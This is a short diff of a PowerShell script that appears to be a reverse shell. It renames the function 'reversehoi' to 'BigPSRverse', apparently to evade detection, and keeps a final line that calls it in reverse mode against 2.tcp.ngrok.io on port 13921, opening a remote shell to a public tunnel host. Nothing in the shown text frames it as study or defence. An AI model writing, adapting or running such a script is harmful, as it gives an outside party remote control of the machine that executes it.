@@ -1,4 +1,4 @@
-function reversehoi
+function BigPSRverse
 {     
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
@@ -86,4 +86,4 @@ function reversehoi
         Write-Error $_
     }
 }
-reversehoi -Reverse -IPAddress 2.tcp.ngrok.io -Port 13921
+BigPSRverse -Reverse -IPAddress 2.tcp.ngrok.io -Port 13921
